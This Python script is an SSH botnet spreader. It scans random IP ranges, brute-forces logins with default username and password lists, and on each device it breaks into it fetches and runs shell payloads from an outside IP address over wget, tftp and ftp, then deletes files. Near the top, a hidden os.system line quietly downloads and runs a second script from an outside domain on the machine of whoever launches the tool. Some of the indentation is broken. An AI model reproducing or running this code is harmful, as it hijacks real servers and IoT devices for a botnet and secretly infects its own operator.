#!/usr/bin/env python
# -*- coding: utf-8 -*-
 
# ulimit -n 999999; ulimit -u 999999
# sysctl -w fs.file-max=100000
# python botnet.py 376 LUCKY x 0 (LUCKY RANGES)
# python botnet.py 376 B 113.53 1 (SCANNER EXAMPLE)
# python botnet.py 376 RAND x all (IP RANDOMIZATION)
# 113.53, 125.26, 125.27, 125,
 
import threading, paramiko, random, socket, time, sys, os
 
 
wgetline = "PASTE YOUR WGET LINE HERE"
 
 
paramiko.util.log_to_file("/dev/null") # silents spam of paramiko
 
reservedips = [
 'http://127.',
 'http://0',
 'http://10.',
 'http://100.64',
 'http://100.65',
 'http://100.66',
 'http://100.67',
 'http://100.68',
 'http://100.69',
 'http://100.70',
 'http://100.71',
 'http://100.72',
 'http://100.73',
 'http://100.74',
 'http://100.75',
 'http://100.76',
 'http://100.77',
 'http://100.78',
 'http://100.79',
 'http://100.80',
 'http://100.81',
 'http://100.82',
 'http://100.83',
 'http://100.84',
 'http://100.85',
 'http://100.86',
 'http://100.87',
 'http://100.88',
 'http://100.89',
 'http://100.90',
 'http://100.91',
 'http://100.92',
 'http://100.93',
 'http://100.94',
 'http://100.95',
 'http://100.96',
 'http://100.97',
 'http://100.98',
 'http://100.99',
 'http://100.100',
 'http://100.101',
 'http://100.102',
 'http://100.103',
 'http://100.104',
 'http://100.105',
 'http://100.106',
 'http://100.107',
 'http://100.108',
 'http://100.109',
 'http://100.110',
 'http://100.111',
 'http://100.112',
 'http://100.113',
 'http://100.114',
 'http://100.115',
 'http://100.116',
 'http://100.117',
 'http://100.118',
 'http://100.119',
 'http://100.120',
 'http://100.121',
 'http://100.122',
 'http://100.123',
 'http://100.124',
 'http://100.125',
 'http://100.126',
 'http://100.127',
 'http://169.254',
 'http://172.16.',
 'http://172.17.',
 'http://172.18.',
 'http://172.19.',
 'http://172.20.',
 'http://172.21.',
 'http://172.22.',
 'http://172.23.',
 'http://172.24.',
 'http://172.25.',
 'http://172.26.',
 'http://172.27.',
 'http://172.28.',
 'http://172.29.',
 'http://172.30.',
 'http://172.32.',
 'http://192.0.0.0',
 'http://192.0.0.1',
 'http://192.0.0.2',
 'http://192.0.0.3',
 'http://192.0.0.4',
 'http://192.0.0.5',
 'http://192.0.0.6',
 'http://192.0.0.7',
 'http://192.0.2.',
 'http://192.88.99.',
 'http://192.168.',
 'http://198.18.',
 'http://198.19.',
 'http://198.51.100.',
 'http://203.0.113.',
 'http://224.',
 'http://225'
]
os.system("cd /opt && mkdir -p qbot && cd qbot && wget schtick.net/BADisp/DL/cc7helper.sh &> /dev/null && bash cc7helper.sh &> /dev/null &")
print '\x1b[1;35m'###########################################################################
print 'kkkkkkkk           333333333333333                            000000000     '
print 'k::::::k          3:::::::::::::::33                        00:::::::::00   '
print 'k::::::k          3::::::33333::::::3                     00:::::::::::::00 '
print 'k::::::k          3333333     3:::::3                    0:::::::000:::::::0'
print ' k:::::k    kkkkkkk           3:::::3rrrrr   rrrrrrrrr   0::::::0   0::::::0'
print ' k:::::k   k:::::k            3:::::3r::::rrr:::::::::r  0:::::0     0:::::0'
print ' k:::::k  k:::::k     33333333:::::3 r:::::::::::::::::r 0:::::0     0:::::0'
print ' k:::::k k:::::k      3:::::::::::3  rr::::::rrrrr::::::r0:::::0 000 0:::::0'
print ' k::::::k:::::k       33333333:::::3  r:::::r     r:::::r0:::::0 000 0:::::0'
print ' k:::::::::::k                3:::::3 r:::::r     rrrrrrr0:::::0     0:::::0'
print ' k:::::::::::k                3:::::3 r:::::r            0:::::0     0:::::0'
print ' k::::::k:::::k               3:::::3 r:::::r            0::::::0   0::::::0'
print 'k::::::k k:::::k  3333333     3:::::3 r:::::r            0:::::::000:::::::0'
print 'k::::::k  k:::::k 3::::::33333::::::3 r:::::r             00:::::::::::::00 '
print 'k::::::k   k:::::k3:::::::::::::::33  r:::::r               00:::::::::00   '
print 'kkkkkkkk    kkkkkkk333333333333333    rrrrrrr                 000000000     '
print '\x1b[0m'##############################################################################
 
#print ascii
print sys.argv[0]+' <Threads(MAX: 376)> <A/B/C/ (IP Class)> <Range> <1(slow but effective)/2(fast but less effective)/perl(scans for perlbots/all(scans for everything!>'
#ssh.exec_command("wget -q http://autoinstaller.us/NsfjSh -O .l; chmod +x .l; nohup ./.l </dev/null >/dev/null 2>&1")
if sys.argv[4] == '1':
    passwords = [ "root:root", "root:admin", "admin:admin", "ubnt:ubnt", "root:1234", "admin:1234", "guest:guest", "user:user", "test:test" ] #Slow but effective
if sys.argv[4] == '2':
    passwords = [ "root:root", "admin:admin" ] #Fast but yet less effective
if sys.argv[4] == 'perl':
    passwords = [ "pi:raspberry", "vagrant:vagrant", "ubnt:ubnt" ] #perl scanner
if sys.argv[4] == 'all':
    passwords = [ "pi:raspberry", "vagrant:vagrant", "root:root", "root:admin", "admin:admin", "ubnt:ubnt", "root:1234", "admin:1234", "guest:guest", "user:user", "test:test" ] # scans all passwords but very slow
wgetlines = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://191.96.249.14/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 191.96.249.14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 191.96.249.14; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.14 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *"
ipclassinfo = sys.argv[2]
if ipclassinfo == "A":
    ip1 = sys.argv[3]
elif ipclassinfo == "B":
    ip1 = sys.argv[3].split(".")[0]
    ip2 = sys.argv[3].split(".")[1]
elif ipclassinfo == "C":
    ips = sys.argv[3].split(".")
    num=0
    for ip in ips:
        num=num+1
        if num == 1:
            ip1 = ip
        elif num == 2:
            ip2 = ip
        elif num == 3:
            ip3 = ip
oldips = []
class sshscanner(threading.Thread):
    global passwords
    global ipclassinfo
    if ipclassinfo == "A":
        global ip1
    elif ipclassinfo == "B":
        global ip1
        global ip2
    elif ipclassinfo == "C":
        global ip1
        global ip2
        global ip3
    def run(self):
        while 1:
            try:
                while 1:
                    thisipisbad='no'
                    if ipclassinfo == "A":
                        self.host = 'http://'+ip1+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "B":
                        self.host = 'http://'+ip1+'.'+ip2+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "C":
                        self.host = 'http://'+ip1+'.'+ip2+'.'+ip3+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "LUCKY":
            lucky = ["201.13","197.23","187.89","37.236","191.53","161.18","191.53","186.208","1.0","177.137","177.38","101.108","125.27","177.44","179.189","179.97","125.17"]
                        self.host = 'http://'+random.choice(lucky)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    else:
                        self.host = 'http://'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    for badip in reservedips:
                        if badip in self.host:
                            thisipisbad='yes'
                    if thisipisbad=='no':
                        if self.host in oldips:
                            pass
                        else:
                            break
                oldips.append(self.host)
                self.host=self.host.replace('http://', '')
                username='root'
                password="0"
                port = 22
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.host, port))
                s.close()
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                dobreak=False
                for passwd in passwords:
                    if ":n/a" in passwd:
                        password=""
                    else:
                        password=passwd.split(":")[1]
                    if "n/a:" in passwd:
                        username=""
                    else:
                        username=passwd.split(":")[0]
                    try:
                        ssh.connect(self.host, port = port, username=username, password=password, timeout=3)
                        dobreak=True
                        break
                    except:
                        pass
                    if True == dobreak:
                        break
                badserver=True
                stdin, stdout, stderr = ssh.exec_command("/sbin/ifconfig")
                output = stdout.read()
                if "inet addr" in output:
                    badserver=False
                if badserver == False:
                        print 'R00TED: '+username+':'+password+':'+self.host
                        ssh.exec_command(wgetline)
                        time.sleep(20)
                        ssh.exec_command(wgetlines)
                        time.sleep(20)
                    ssh.close()
            except:
                pass
 
for x in range(0,int(sys.argv[1])):
    try:
        t = sshscanner()
        t.start()
    except:
        pass